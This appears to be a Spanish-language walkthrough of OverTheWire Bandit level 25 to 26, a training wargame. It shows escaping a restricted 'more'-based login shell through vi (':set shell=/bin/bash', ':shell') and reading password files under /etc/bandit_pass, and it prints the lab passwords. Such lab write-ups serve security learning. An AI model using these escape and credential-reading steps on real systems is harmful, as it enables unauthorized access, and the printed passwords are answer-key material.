## Bandit  Level 25 -> 26

---
## Objetivo
Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not **/bin/bash**, but something else. Find out what it is, how it works and how to break out of it.

---
## Datos de acceso
- user -> **bandit25**
- Passwor -> p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
- host ->  **bandit.labs.overthewire.org**
- port -> **2220**


---
## Solución
```shell
bandit25@bandit:~$ ls
bandit26.sshkey
bandit25@bandit:~$ ssh bandit26@localhost -i bandit26.sshkey
Connection to bandit.labs.overthewire.org closed.


bandit25@bandit:~$ cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
bandit25@bandit:~$ cat /home/bandit26:/usr/bin/showtext
cat: '/home/bandit26:/usr/bin/showtext': No such file or directory
bandit25@bandit:~$ cat /usr/bin/showtext
#!/bin/sh

export TERM=linux

exec more ~/text.txt
exit 0
bandit25@bandit:~$ 

se preciona v

:set shell=/bin/bash
:shell
bandit26@bandit:~$ ls
bandit27-do  text.txt
bandit26@bandit:~$ 
bandit26@bandit:~$ cat /etc/bandit_pass/bandit26 
c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
bandit26@bandit:~$ 
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
bandit26@bandit:~$ 



```

---
## Notas adicionales
bandit25@bandit:~$ cat /usr/bin/showtext
#!/bin/sh

export TERM=linux

exec more ~/text.txt
exit 0

Si tienes una ventana más grande que el texto que te muestra, en este caso “bandit26” en asciiart, more se ejecutará y cerrará, cerrando la sesión.


-Se puden jecutar comandos desde vi
:set shell=/bin/bash -> cambiar el shell
:shell -> entrar al shell


---
## Referencias
https://marmeus.com/post/Bandit#level-25